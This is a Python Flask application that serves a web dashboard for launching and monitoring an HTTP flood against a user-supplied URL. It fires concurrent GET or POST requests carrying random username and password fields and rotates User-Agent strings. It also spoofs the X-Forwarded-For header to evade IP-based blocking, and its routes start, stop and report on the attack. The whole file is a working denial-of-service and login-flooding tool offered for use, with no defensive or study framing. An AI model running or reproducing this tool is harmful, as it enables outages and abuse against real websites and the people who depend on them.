# main.py
from flask import Flask, render_template, request, jsonify
import threading
import asyncio
import aiohttp
import random
import string
from fake_useragent import UserAgent
import time
import psutil
from datetime import datetime

app = Flask(__name__)
ua = UserAgent()

stats = {
    "total": 0,
    "success": 0,
    "fail": 0,
    "status": "idle"
}

flood_task = None
flood_loop = None
stop_event = threading.Event()
flood_tasks = []
log_file = "logs.txt"

# ------------------- Utility Functions -------------------
def generate_payload():
    return {
        "username": ''.join(random.choices(string.ascii_letters, k=8)),
        "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    }

def spoof_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def save_log(entry):
    with open(log_file, "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {entry}\n")

# ------------------- Async Flood Function -------------------
async def flood(session, url, delay, method):
    try:
        while not stop_event.is_set():
            try:
                headers = {
                    "User-Agent": ua.random,
                    "X-Forwarded-For": spoof_ip(),
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = generate_payload()
                if method == "POST":
                    async with session.post(url, data=data, headers=headers) as resp:
                        status = resp.status
                else:
                    async with session.get(url, headers=headers, params=data) as resp:
                        status = resp.status

                stats["total"] += 1
                if status == 200:
                    stats["success"] += 1
                    save_log(f"SUCCESS {status} {url}")
                else:
                    stats["fail"] += 1
                    save_log(f"FAIL {status} {url}")
            except Exception as e:
                stats["fail"] += 1
                stats["total"] += 1
                save_log(f"ERROR {str(e)}")
            await asyncio.sleep(delay)
    except asyncio.CancelledError:
        pass

async def start_flood(url, thread_count, delay, method):
    stats["status"] = "running"
    async with aiohttp.ClientSession() as session:
        global flood_tasks
        flood_tasks = [asyncio.create_task(flood(session, url, delay, method)) for _ in range(thread_count)]
        await asyncio.gather(*flood_tasks, return_exceptions=True)

# ------------------- Thread Wrapper -------------------
def run_flood(url, threads, delay, method):
    global flood_task, flood_loop
    stop_event.clear()
    flood_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(flood_loop)
    flood_task = flood_loop.create_task(start_flood(url, threads, delay, method))
    flood_loop.run_until_complete(flood_task)

# ------------------- Flask Routes -------------------
@app.route("/")
def dashboard():
    return render_template("dashboard.html")

@app.route("/start", methods=["POST"])
def start():
    data = request.json
    url = data["url"]
    threads = int(data["threads"])
    delay = float(data["delay"])
    method = data["method"].upper()

    # Reset stats
    stats["total"] = 0
    stats["success"] = 0
    stats["fail"] = 0
    stats["status"] = "initializing"

    # Clear log
    open(log_file, "w").close()

    threading.Thread(target=run_flood, args=(url, threads, delay, method), daemon=True).start()
    return jsonify({"status": "started"})

@app.route("/stop", methods=["POST"])
def stop():
    stop_event.set()
    stats["status"] = "stopped"

    for task in flood_tasks:
        task.cancel()

    return jsonify({"status": "stopped"})

@app.route("/stats")
def get_stats():
    return jsonify({
        "stats": stats,
        "cpu": psutil.cpu_percent(),
        "ram": psutil.virtual_memory().percent
    })

@app.route("/log")
def get_log():
    try:
        with open(log_file, "r") as f:
            return f.read()
    except FileNotFoundError:
        return "No log file found."

if __name__ == "__main__":
    app.run(debug=False)